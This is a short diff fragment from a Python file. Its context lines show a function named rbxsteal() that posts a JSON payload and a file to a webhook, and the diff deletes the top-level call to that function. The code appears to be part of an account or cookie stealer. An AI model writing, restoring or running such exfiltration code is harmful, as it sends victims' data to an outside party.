@@ -148,4 +148,3 @@ def rbxsteal():
  r = requests.post(hook, data=json.dumps(payload), headers=headers)
  fil = requests.post(hook, files=file)
 
-rbxsteal()
